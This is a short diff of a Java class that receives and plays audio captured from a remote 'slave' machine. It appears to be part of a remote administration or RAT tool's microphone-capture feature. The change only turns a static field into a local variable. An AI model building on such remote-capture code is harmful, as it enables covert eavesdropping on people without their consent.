@@ -14,8 +14,7 @@ import javax.sound.sampled.SourceDataLine;
 
 public class Packet58ServerDownloadSoundCapture implements IncomingPacket {
 
-	private static DataLine.Info info;
-	private static SourceDataLine line;
+    private static SourceDataLine line;
 
 	private static boolean initialized;
 
@@ -26,8 +25,8 @@ public class Packet58ServerDownloadSoundCapture implements IncomingPacket {
 		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.INSTANCES.get(slave);
 		if (!initialized) {
 			AudioFormat format = Sound.getFormat(quality);
-			
-			info = new DataLine.Info(SourceDataLine.class, format);
+
+            DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);
 			if (!AudioSystem.isLineSupported(info)) {
 				throw new Exception("Sound line is not supported");
 			}
